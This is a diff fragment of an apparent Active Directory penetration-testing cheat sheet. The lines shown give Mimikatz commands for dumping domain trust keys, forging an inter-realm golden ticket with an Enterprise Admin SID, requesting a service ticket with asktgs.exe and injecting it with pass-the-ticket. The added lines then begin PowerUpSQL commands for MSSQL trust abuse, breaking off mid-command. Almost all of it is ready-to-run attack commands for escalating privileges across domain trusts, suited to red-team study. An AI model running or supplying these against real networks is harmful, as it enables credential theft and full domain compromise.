@@ -140,3 +140,16 @@ Invoke-Userhunter -CheckAccess : To confirm admin access
 -     Invoke-Mimikatz -command '"lsadump::trust /patch"' -computername
 - Inter-Realm TGT can be forged 
 -     Invoke-mimikatz -command '"kerberos::golden /user:Administrator<user to impersonate>  /domain:<current domain> /sid:<sid of current domain> /sids:<sid of Enterprise Admin group of parent domain> /rc4: rc4 of the trust key  /service:krbtgt<target service in parent domain> /target:<parent domain> /ticket:ticket.kirbi"'
+- Asking a TGS for a service 
+-     .\asktgs.exe ticket.kirbi CIFS/parentdomain.local
+- Injecting Ticket in memory
+-     Invoke-mimikatz -command '"kerberos::ptt ticket.kirbi"'
+
+## Trust Abuse -MSSQL Servers
+
+- Discovery of SPN
+-      Get-SQLInstanceDomain
+- Checking Accessibility of server
+-      Get-SQLConnectionTestThread
+- Searching Database Links
+-      Get-SQLServerLink -Instance <
